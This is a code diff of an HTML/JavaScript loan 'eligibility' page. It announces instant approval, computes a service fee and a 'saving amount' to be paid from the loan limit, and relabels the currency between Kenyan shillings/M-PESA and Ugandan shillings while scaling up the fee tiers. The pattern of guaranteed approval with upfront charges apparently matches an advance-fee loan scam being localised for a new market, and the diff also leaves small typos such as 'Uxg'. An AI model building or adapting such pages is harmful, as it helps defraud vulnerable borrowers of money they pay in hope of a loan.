@@ -295,10 +295,10 @@
         <h1 style="color: white;">Eligibility Successful. You Qualify for a Loan.</h1>
         <h2 style="color: rgb(237, 230, 230);">Early settlement may result in reduction of interest                                                                             .</h2>
         <h3 style="color: rgb(175, 170, 170);">Loan Amount Qualified</h3>
-        <h4 style="color: white;" id="limit">Ugx 6,500</h4>
+        <h4 style="color: white;" id="limit">Uxg 6,500</h4>
         <h5 style="color: rgb(151, 147, 147);">Term <span style="margin-left: 50%;"> Receive Amount</span></h5>
         <h4 style="color: white;">14 days <span style="margin-left: 45%;" id="received"> Ugx 5,3440</span></h6>
-       <!--p style="color: white;"> Hi, you qualify for a Loan of <span style="font-weight: bolder;" >Ugx. 4500</span> to your M-PESA. Your loan repayment period is 2 months with 8% interest rate. Terms and conditions apply</p-->
+       <!--p style="color: white;"> Hi, you qualify for a Loan of <span style="font-weight: bolder;" >Ksh. 4500</span> to your M-PESA. Your loan repayment period is 2 months with 8% interest rate. Terms and conditions apply</p-->
         <!--button class="verify-buttons">Complete verification to receive your loan</button-->
     </div>
 
@@ -331,7 +331,7 @@
             <!--div class="labels" id="user-name">Wei bwana</div-->
         </div>
         <div>
-            <!--div class="labels"> Account Number : <span style="margin-left: 5%;"> <strong></strong></span></div-->
+            <!--div class="labels"> Mpesa Number : <span style="margin-left: 5%;"> <strong></strong></span></div-->
             <div class="labels" id="phonenumber"></div>
         </div>
         <div>
@@ -362,32 +362,32 @@
         let fee = 0.00;
         let savingamount = 0.00;
         
-        if (lims >= 15000) {
-            fee = 92.00;
-            savingamount = 325.00;
+        if (lims >= 407700) {
+            fee = 2500.56;
+            savingamount = 8833.50;
             //lims = lims - fee;
-        } else  if (lims >= 10000) {
-            fee = 81.00;
-            savingamount = 275.00;
+        } else  if (lims >= 271800) {
+            fee = 2201.58;
+            savingamount = 7474.50;
             //lims = lims - fee;
-        } else if (lims >= 7000) {
-            fee = 68.00;
-            savingamount = 255.00;
+        } else if (lims >= 190260) {
+            fee = 1848.24;
+            savingamount = 6930.90;
             //lims = lims - fee;
-        } else if (lims >= 5000) {
-            fee = 57.00;
-            savingamount = 165.00;
+        } else if (lims >= 135900) {
+            fee = 1549.26;
+            savingamount = 4484.70;
             //lims = lims - fee;
         } else if (lims >= 0) {
-            fee = 39.00;
-            savingamount = 100.00;
+            fee = 1060.02;
+            savingamount = 2718.00;
             //lims = lims - fee;
         }
 
         console.log(savingamount)
         localStorage.setItem('saveamount',savingamount);
 
-        //limit.textContent = "Ugx " + lims;
+        //limit.textContent = "Ksh " + lims;
         let interestR = (lims * 0.08);
         interestrate.textContent = "Ugx" + (interestR.toFixed(2));
         Servicefee.textContent = "Ugx " + (fee.toFixed(2));
